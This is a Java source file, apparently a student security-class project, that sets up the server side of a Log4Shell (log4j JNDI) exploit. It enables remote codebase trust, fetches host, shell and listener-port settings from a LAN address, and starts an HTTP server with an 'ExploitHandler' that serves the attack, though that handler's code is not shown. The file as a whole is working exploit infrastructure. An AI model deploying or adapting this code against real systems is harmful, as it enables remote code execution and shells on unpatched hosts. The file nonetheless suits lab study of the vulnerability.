package hpc.mvn.web.exploit;
//----------
import hpc.mvn.web.exploit.Util;
import hpc.mvn.web.exploit.ExploitHandler;
//----------
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;
import com.sun.net.httpserver.HttpServer;
import java.net.*;
/**
 *
 * @author	Muhammad Nur Irsyad
 * @id		1807422020
 * @class	CCIT SEC 8 (TMJ)
 */
public class Main {
    private static final Logger logger = LogManager.getLogger(Main.class);
    private static int port;
    //----------	
    public static void main (String[] args) throws Exception {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
    //    System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "true");   		
        //----------			
        String[] json  = Util.jsonParser("http://192.168.1.9:2080/properties");  
        // [0] = HOST, [1] = SHELL, [2] = PORT_LISTENER, [3] = PORT_JAVA_HTTP
        port = Integer.parseInt(json[3]);               
        //----------			
        HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
        server.createContext("/", new ExploitHandler());
        server.setExecutor(null);
        server.start();
        logger.debug("starting log4hshell http server at :"+port+" ...");		
    }     
}
